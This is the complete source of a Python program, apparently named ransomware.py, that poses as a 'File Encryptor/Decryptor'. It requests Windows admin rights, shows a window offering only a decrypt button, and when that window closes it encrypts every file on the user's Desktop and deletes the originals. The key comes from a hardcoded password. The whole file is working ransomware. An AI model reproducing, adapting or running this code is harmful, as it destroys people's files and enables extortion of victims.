import ctypes
import sys
from tkinter import messagebox, simpledialog, Tk, Button
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.fernet import Fernet
import base64
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

password = "password"

def derive_key(password):
    kdf = Scrypt(salt=b"", length=32, n=2**14, r=8, p=1)
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

key = derive_key(password)

def validate_password(input_password):
    """Check if the provided password is correct."""
    return derive_key(input_password) == key

def simplify_enc_extensions(directory):
    """
    Ensures files only have a single `.enc` extension in the specified directory.
    """
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".enc"):
                filepath = os.path.join(root, file)
                simplified_filepath = filepath
                while simplified_filepath.endswith(".enc.enc"):
                    simplified_filepath = simplified_filepath[:-4]
                if simplified_filepath != filepath:
                    os.rename(filepath, simplified_filepath)
                    print(f"Renamed: {filepath} -> {simplified_filepath}")

def encrypt_directory(directory, key, chunk_size=1024 * 1024):
    try:
        f = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                if file.lower() in ["desktop.ini", "ransomware.py"] or file.endswith(".enc"):
                    print(f"Skipping: {file}")
                    continue

                filepath = os.path.join(root, file)
                encrypted_filepath = filepath + ".enc"

                try:
                    with open(filepath, "rb") as file_obj, open(encrypted_filepath, "wb") as enc_file:
                        while chunk := file_obj.read(chunk_size):
                            encrypted_data = f.encrypt(chunk)
                            enc_file.write(encrypted_data)

                    os.remove(filepath)
                    print(f"Encrypted: {filepath}")
                except Exception as e:
                    print(f"Failed to encrypt {filepath}: {e}")

        simplify_enc_extensions(directory)
        messagebox.showinfo("Success", "All files encrypted successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Encryption failed: {e}")

def decrypt_directory(directory, key):
    try:
        entered_password = simpledialog.askstring(
            "Password Required", "Enter the decryption password:", show="*"
        )
        
        if not entered_password or not validate_password(entered_password):
            messagebox.showerror("Error", "Incorrect password. Decryption aborted.")
            return
        
        f = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                if not file.endswith(".enc"):
                    continue
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, "rb") as file_obj:
                        encrypted_data = file_obj.read()
                    decrypted_data = f.decrypt(encrypted_data)
                    decrypted_filepath = filepath[:-4]
                    with open(decrypted_filepath, "wb") as file_obj:
                        file_obj.write(decrypted_data)
                    os.remove(filepath)
                except Exception as e:
                    print(f"Failed to decrypt {filepath}: {e}")
        
        messagebox.showinfo("Success", "Decryption completed successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

def encrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    encrypt_directory(desktop_path, key)

def decrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    decrypt_directory(desktop_path, key)

if __name__ == "__main__":
    print("Starting File Encryptor/Decryptor...")

    root = Tk()
    root.title("File Encryptor/Decryptor")

    root.geometry("300x150")

    decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
    decrypt_button.pack(pady=10)

    root.mainloop()

    print("Encrypting files on Desktop...")
    encrypt_desktop()
    print("Encryption completed.")